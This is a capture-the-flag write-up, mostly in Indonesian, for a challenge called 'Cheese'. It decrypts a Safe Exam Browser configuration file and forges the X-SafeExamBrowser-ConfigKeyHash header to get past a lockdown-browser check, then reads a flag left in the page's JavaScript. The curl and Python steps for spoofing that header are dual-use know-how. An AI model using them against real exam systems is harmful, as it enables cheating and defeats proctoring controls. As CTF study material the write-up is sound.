# Cheese — Writeup

**Category:** Misc
**Challenge:** Cheese

## 1. Initial reconnaissance

Landing page:

```bash
curl https://cheese-033cc1c0e999.chall.nnsc.tf
```

Memberikan:

```html
<p>This exam runs in Safe Exam Browser only.</p>
<p><a href="sebs://cheese-033cc1c0e999.chall.nnsc.tf/exam.seb">Launch exam</a></p>
<p>Configuration password: <code>q-JpVORvQSUQ</code></p>
```

Clue penting:

```text
It is not recommended to open the "exam link" directly on your machine.
```

Jadi jangan menjalankan `sebs://` atau membuka exam secara langsung. Kita analisis file konfigurasi `.seb`.

---

## 2. Download `exam.seb`

```bash
curl -sk -D- 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam.seb' -o exam.seb
```

Response:

```text
HTTP/2 200
content-type: application/seb
content-length: 4509
```

Cek file:

```bash
file exam.seb
```

Output:

```text
exam.seb: gzip compressed data
```

---

## 3. Decompress `.seb`

```bash
gzip -dc exam.seb > exam.raw
```

Header file:

```bash
xxd -l 32 exam.raw
```

dimulai dengan:

```text
7073 7764 0201 ...
```

ASCII:

```text
pswd
```

Ini menunjukkan konfigurasi SEB tersebut menggunakan password-protected format.

Password sudah diberikan oleh halaman:

```text
q-JpVORvQSUQ
```

---

## 4. Decrypt konfigurasi

Payload SEB kemudian didecrypt menggunakan password konfigurasi.

Hasil decryption berupa gzip:

```bash
gzip -dc exam.xml.gz > exam.xml
```

Setelah dibuka, isinya adalah Apple plist XML.

Kita cari setting URL:

```bash
grep -nE '<key>(startURL|browserExamKey|hashedAdminPassword|quitURL|URLFilterRules|originatorVersion)</key>' exam.xml
```

Ditemukan:

```text
5228:   <key>startURL</key>
```

Parse plist:

```python
import plistlib

d = plistlib.loads(open("exam.xml","rb").read())

for k,v in d.items():
    if any(x in k.lower() for x in ["url","key","password","exam","resource","server"]):
        print(f"{k}: {v!r}")
```

Hasil penting:

```text
sendBrowserExamKey: True
startURL: 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'
```

Jadi endpoint sebenarnya adalah:

```text
https://cheese-033cc1c0e999.chall.nnsc.tf/exam
```

---

## 5. Endpoint menolak browser biasa

Coba:

```bash
curl -sk -i 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'
```

Response:

```text
HTTP/2 403
{"detail":"Safe Exam Browser required"}
```

Mengganti User-Agent juga tidak cukup:

```bash
curl -sk -i \
  -A 'Mozilla/5.0' \
  'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'
```

Tetap:

```text
403 Safe Exam Browser required
```

Karena konfigurasi memiliki:

```text
sendBrowserExamKey = True
```

server kemungkinan memvalidasi header SEB.

---

## 6. Hitung SEB Config Key

Dari konfigurasi yang sudah didecrypt, kita hitung Config Key sesuai mekanisme SEB.

Hasil:

```text
CONFIG_KEY =
59139a49c187bdcca140b7e34207b17de056b2424ceedc8c67bf8c7ed682f577
```

Kemudian request hash:

```text
REQUEST_HASH =
e632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61
```

Header yang dibutuhkan:

```text
X-SafeExamBrowser-ConfigKeyHash: e632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61
```

---

## 7. Bypass SEB check

Request dikirim menggunakan header SEB:

```python
req = urllib.request.Request(
    "https://cheese-033cc1c0e999.chall.nnsc.tf/exam",
    headers={
        "X-SafeExamBrowser-ConfigKeyHash":
        "e632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61"
    }
)
```

Dan hasilnya:

```text
STATUS = 200
```

Server memberikan halaman exam.

---

## 8. Source halaman langsung membocorkan flag

Response halaman:

```html
<h1>Question 1</h1>
<p>What's the flag?</p>

<input id="answer" autocomplete="off" autofocus />

<button id="check">Check</button>

<script>
  const flag = "NNS{5aY_Ch3353_anD_5M1l3_f0R_7He_10cKd0wN_bRoWs3r_4ND_h0pe_7h47_yoU_63t_th3_C0Rr3C7_ansW3R_soM3how}";
</script>
```

Jadi tidak perlu benar-benar menjalankan Safe Exam Browser atau menjawab melalui UI.

Flag berada langsung di JavaScript source.

# Flag

```text
NNS{5aY_Ch3353_anD_5M1l3_f0R_7He_10cKd0wN_bRoWs3r_4ND_h0pe_7h47_yoU_63t_th3_C0Rr3C7_ansW3R_soM3how}
```

## Attack chain

```text
/exam.seb
    ↓
download config
    ↓
gzip decompress
    ↓
decrypt with config password
    ↓
extract startURL
    ↓
/exam
    ↓
403 Safe Exam Browser required
    ↓
calculate SEB ConfigKeyHash
    ↓
send X-SafeExamBrowser-ConfigKeyHash
    ↓
HTTP 200
    ↓
inspect HTML/JS
    ↓
flag hardcoded in JavaScript
```

